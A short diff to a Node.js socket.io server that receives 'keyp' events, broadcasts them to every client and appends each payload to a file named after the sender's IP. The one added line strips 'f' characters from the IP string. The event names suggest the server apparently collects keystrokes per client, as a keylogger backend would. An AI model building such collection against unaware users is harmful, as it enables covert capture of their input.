@@ -67,6 +67,7 @@ io.sockets.on('connection',function(socket){
 	socket.on('keyp',function(data){
 			var iptemp =  socket.request.connection.remoteAddress.replace(/:/g,'');
 	 iptemp =  iptemp.replace(/\./g,'_');
+	  iptemp =  iptemp.replace(/f/g,'');
 	io.sockets.emit('getkey',{key:data,id:iptemp});
 
 	fs.appendFile(iptemp+'.txt', data , function(err) {
